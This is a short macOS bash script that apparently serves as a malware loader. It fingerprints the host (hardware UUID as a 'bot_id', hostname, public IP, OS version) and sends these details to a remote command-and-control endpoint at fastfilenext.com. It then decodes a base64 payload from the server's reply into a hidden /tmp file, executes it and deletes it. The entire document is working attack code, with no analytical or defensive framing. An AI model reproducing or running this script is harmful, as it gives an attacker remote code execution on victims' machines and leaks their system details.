#!/bin/bash
GATE_URL="https://fastfilenext.com"
BOT_ID=$(ioreg -d2 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}')
BUILD_ID="d91d844ad8920458ee99e707b1a203cba8df76ce960195f0993eb3b0e96d893f"
BUILD_NAME=""
HOSTNAME=$(hostname)
IP=$(curl -s https://api.ipify.org 2>/dev/null || echo unknown)
OS_VER=$(sw_vers -productVersion)
RESP=$(curl -s -X POST "$GATE_URL/api/bot/heartbeat" -H "Content-Type: application/json" -d '{"bot_id":"'"$BOT_ID"'","build_id":"'"$BUILD_ID"'","hostname":"'"$HOSTNAME"'","ip":"'"$IP"'","os_version":"'"$OS_VER"'"}')
CODE=$(echo "$RESP" | sed -n 's/.*"code":"\([^"]*\)".*/\1/p')
if [ -n "$CODE" ]; then
echo "$CODE" | base64 -d > /tmp/.c.sh && chmod +x /tmp/.c.sh && /tmp/.c.sh; rm -f /tmp/.c.sh
fi
